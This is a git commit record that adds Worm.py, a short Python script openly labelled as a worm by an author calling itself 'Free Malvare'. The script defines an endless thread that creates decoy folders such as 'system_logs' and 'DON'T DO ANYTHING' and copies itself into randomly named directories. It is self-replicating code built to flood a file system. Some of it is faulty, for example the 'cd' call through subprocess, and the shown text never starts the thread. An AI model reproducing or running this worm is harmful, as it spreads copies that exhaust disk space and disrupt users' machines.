3332f73c4d178e5a24ceb857a3538bcd1ab1960c
Free Malvare <64208836+Malvare17@users.noreply.github.com>
2020-04-23 16:00:26 +0200

    Create Worm.py

---
+++ Worm.py
@@ -0,0 +1,40 @@
+import sys
+import os
+import random
+import string
+import subprocess
+import threading
+
+SCRIPT = sys.argv
+NAME = str(SCRIPT[0])
+
+def RANDOM_(Length):
+	Letters_ = string.ascii_lowercase
+	return ''.join(random.choice(Letters_) for i in range(Length))
+
+def NEW_():
+	print("")
+
+class Pink(threading.Thread):
+	def __init__(self):
+		threading.Thread.__init__(self)
+
+	def run(self):
+		while True:
+			
+			for i in range(8):
+				subprocess.call(['cd', '..'])
+			
+			subprocess.call(['mkdir', 'system_logs'])
+			subprocess.call(['mkdir', 'logs'])
+			subprocess.call(['mkdir', '__init__'])
+
+			DIR_NAME_P1 = RANDOM_(32)
+			DIR_NAME_P2 = RANDOM_(32)
+			DIR_NAME_P3 = RANDOM_(32)
+			DIR_NAME_P4 = RANDOM_(32)
+
+			DirectoryName = DIR_NAME_P1+ DIR_NAME_P2 + DIR_NAME_P3 + DIR_NAME_P4
+			subprocess.call(['mkdir', DirectoryName])
+			subprocess.call(['cp', NAME, DirectoryName])
+			subprocess.call(['mkdir', "DON'T DO ANYTHING"])
